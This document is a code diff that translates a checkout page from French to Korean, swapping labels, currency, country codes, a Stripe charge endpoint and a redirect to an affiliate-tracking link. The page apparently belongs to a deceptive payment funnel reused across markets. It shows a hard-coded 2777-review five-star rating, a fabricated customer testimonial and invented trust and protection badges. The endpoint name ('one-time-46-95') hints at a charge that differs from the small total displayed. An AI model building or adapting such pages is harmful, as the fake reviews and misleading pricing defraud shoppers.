@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ko">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Paiement Sécurisé</title>
+  <title>안전한 결제</title>
   <meta name="referrer" content="no-referrer">
 
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
@@ -22,7 +22,7 @@
     *{box-sizing:border-box}
     body{
       margin:0; background:var(--bg); color:var(--text);
-      font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+      font-family: 'Pretendard', Inter, system-ui, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
     }
     .safe{background:#0a0a0a;color:#fff;font-size:12px;padding:6px 10px}
     .wrap{max-width:1100px;margin:0 auto;padding:18px 14px 60px}
@@ -34,7 +34,7 @@
     .card{background:#fff;border:1px solid var(--line);border-radius:12px;padding:22px}
     .h2{font-size:18px;font-weight:800;margin-bottom:14px}
     .label{font-weight:700;font-size:13px;margin:4px 0}
-    .input,.select,.el{width:100%;border:1px solid #cfd6e4;border-radius:10px;padding:12px}
+    .input,.select,.el{width:100%;border:1px solid #cfd6e4;border-radius:10px;padding:12px;font-size:15px}
     .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
     .form-grid-1{display:grid;grid-template-columns:1fr;gap:10px}
     @media(max-width:620px){.form-grid{grid-template-columns:1fr}}
@@ -89,13 +89,13 @@
 </head>
 
 <body>
-<div class="safe">Paiement sécurisé par SSL</div>
+<div class="safe">SSL 보안 결제</div>
 
 <div class="wrap">
   <div class="page-title">
-    Paiement Sécurisé 🔒
+    안전한 결제 🔒
     <span class="stars">★★★★★</span>
-    <span class="reviews">(2777 avis)</span>
+    <span class="reviews">(2777개의 리뷰)</span>
   </div>
 
   <div class="grid">
@@ -106,65 +106,65 @@
           <img id="heroImg" alt="">
           <div>
             <div id="heroTitle" class="title"></div>
-            <div class="tiny">Informations sur le produit de votre lien</div>
+            <div class="tiny">링크를 통한 제품 정보</div>
           </div>
         </div>
 
-        <div class="h2">1. Informations</div>
+        <div class="h2">1. 배송 정보</div>
 
         <div class="form-grid">
           <div>
-            <div class="label">Prénom</div>
+            <div class="label">이름 (First Name)</div>
             <input id="firstName" class="input">
           </div>
           <div>
-            <div class="label">Nom</div>
+            <div class="label">성 (Last Name)</div>
             <input id="lastName" class="input">
           </div>
         </div>
 
         <div class="form-grid">
           <div style="grid-column:1/-1">
-            <div class="label">Adresse</div>
+            <div class="label">상세 주소</div>
             <input id="billingStreet" class="input">
           </div>
           <div>
-            <div class="label">Code postal</div>
+            <div class="label">우편번호</div>
             <input id="billingPostcode" class="input">
           </div>
           <div>
-            <div class="label">Ville</div>
+            <div class="label">도시 (시/군/구)</div>
             <input id="billingCity" class="input">
           </div>
         </div>
 
         <div class="form-grid">
           <div>
-            <div class="label">E-mail</div>
+            <div class="label">이메일 주소</div>
             <input id="emailInput" class="input">
           </div>
           <div>
-            <div class="label">Pays</div>
-            <input id="billingCountry" class="input" value="Belgique" disabled>
+            <div class="label">국가</div>
+            <input id="billingCountry" class="input" value="대한민국" disabled>
           </div>
         </div>
 
         <div class="form-grid">
           <div>
-            <div class="label">Préfixe</div>
+            <div class="label">국가 번호</div>
             <select id="phonePrefix" class="select">
-              <option value="+32">+32 — Belgique</option>
+              <option value="+82">+82 — 대한민국</option>
             </select>
           </div>
           <div>
-            <div class="label">Numéro de téléphone</div>
+            <div class="label">전화번호</div>
             <input id="phoneNumber" class="input">
           </div>
         </div>
 
         <input id="nameInput" style="display:none">
 
-        <button id="nextBtn" class="btn">Continuer</button>
+        <button id="nextBtn" class="btn">계속하기</button>
 
         <div class="logos">
           <img src="/visa.png">
@@ -175,7 +175,7 @@
       </section>
 
       <section id="step2" class="step" aria-hidden="true">
-        <div class="h2">2. Paiement</div>
+        <div class="h2">2. 결제 수단</div>
 
         <div class="form-grid-1">
           <div><div id="card-number" class="el"></div></div>
@@ -188,19 +188,19 @@
         <div id="err" class="err"></div>
 
         <div style="display:flex;gap:10px;margin-top:12px">
-          <button id="backBtn" class="btn muted" style="width:40%">← Retour</button>
-          <button id="payNow" class="btn" style="width:60%">Payer en toute sécurité</button>
+          <button id="backBtn" class="btn muted" style="width:40%">← 이전으로</button>
+          <button id="payNow" class="btn" style="width:60%">안전하게 결제하기</button>
         </div>
       </section>
     </div>
 
     <aside>
       <div class="widget">
-        <div style="text-align:center;font-weight:800">Ce que disent nos clients</div>
+        <div style="text-align:center;font-weight:800">고객 후기</div>
         <div style="text-align:center">Fenella Lara</div>
         <div style="text-align:center;color:#f6b80c">★★★★★</div>
         <p class="tiny" style="text-align:center">
-          J'ai reçu mon produit hier. Livraison rapide et excellent service !
+          어제 제품을 받았습니다. 빠른 배송과 훌륭한 서비스에 만족합니다!
         </p>
       </div>
 
@@ -208,24 +208,24 @@
         <div class="delivery">
           <img id="sidebarImg">
           <div>
-            <div style="font-weight:800">Livraison rapide</div>
-            <div class="tiny">3–5 jours ouvrables</div>
+            <div style="font-weight:800">빠른 배송</div>
+            <div class="tiny">영업일 기준 3–5일</div>
           </div>
-          <div style="margin-left:auto;font-weight:800">Gratuit</div>
+          <div style="margin-left:auto;font-weight:800">무료</div>
         </div>
 
-        <div style="font-weight:800;margin-top:12px">Résumé de la commande</div>
+        <div style="font-weight:800;margin-top:12px">주문 요약</div>
         <div style="display:flex;justify-content:space-between">
-          <span>Total</span><span>€2.00</span>
+          <span>합계</span><span>₩19,899</span>
         </div>
       </div>
 
       <div class="widget">
-        <div style="font-weight:800">BOUTIQUE DE CONFIANCE</div>
+        <div style="font-weight:800">신뢰할 수 있는 쇼핑몰</div>
         <div class="trust">
-          <div><b>99%</b><div class="tiny">Satisfaits</div></div>
-          <div><b>Sécurisé</b><div class="tiny">SSL</div></div>
-          <div><b>€10k</b><div class="tiny">Protection</div></div>
+          <div><b>99%</b><div class="tiny">만족도</div></div>
+          <div><b>보안</b><div class="tiny">SSL</div></div>
+          <div><b>₩1,500만</b><div class="tiny">보호</div></div>
         </div>
       </div>
     </aside>
@@ -234,9 +234,9 @@
 
 <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
   <div class="loading-box">
-    <div class="loading-title">Traitement du paiement…</div>
+    <div class="loading-title">결제 처리 중…</div>
     <div class="progress-wrap"><div class="progress-bar"></div></div>
-    <p class="tiny" style="margin-top:10px">Veuillez patienter un instant…</p>
+    <p class="tiny" style="margin-top:10px">잠시만 기다려 주세요…</p>
   </div>
 </div>
 
@@ -303,7 +303,7 @@ window.addEventListener('DOMContentLoaded', () => {
           line1: billingStreet.value,
           city: billingCity.value,
           postal_code: billingPostcode.value,
-          country: "BE"
+          country: "KR"
         }
       };
 
@@ -316,7 +316,7 @@ window.addEventListener('DOMContentLoaded', () => {
       if (pm.error) throw pm.error;
 
       // ✅ API Endpoint from German file
-      const r = await fetch("/api/stripe/one-time-33-95",{
+      const r = await fetch("/api/stripe/one-time-46-95",{
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body: JSON.stringify({
@@ -334,11 +334,11 @@ window.addEventListener('DOMContentLoaded', () => {
       if (result.error) throw result.error;
 
       if (!result.paymentIntent || result.paymentIntent.status !== 'succeeded') {
-        throw new Error('Paiement non complété');
+        throw new Error('결제가 완료되지 않았습니다.');
       }
 
       // ✅ Redirect URL from German file
-      location.href='https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7?';
+      location.href='https://cudsr.bemobtrcks.com/go/a0224109-84eb-47be-926c-e1a7232611a7';
 
     } catch(e){
       err.textContent = e.message;
